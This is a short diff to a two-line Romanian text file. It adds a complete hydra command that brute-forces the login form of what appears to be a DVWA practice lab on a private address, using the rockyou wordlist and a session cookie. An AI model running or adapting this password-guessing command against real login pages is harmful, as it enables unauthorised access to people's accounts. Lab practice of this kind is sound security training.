@@ -1,2 +1,3 @@
  Cine este cu STeau 
  Linia doi 
+hydra -l admin -P rockyou.txt 'http-get-form://192.168.5.4/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\:PHPSESSID=faj5lpc7tu3olda19k5cofnmm2; security=low:F=Username and/or password incorrect'
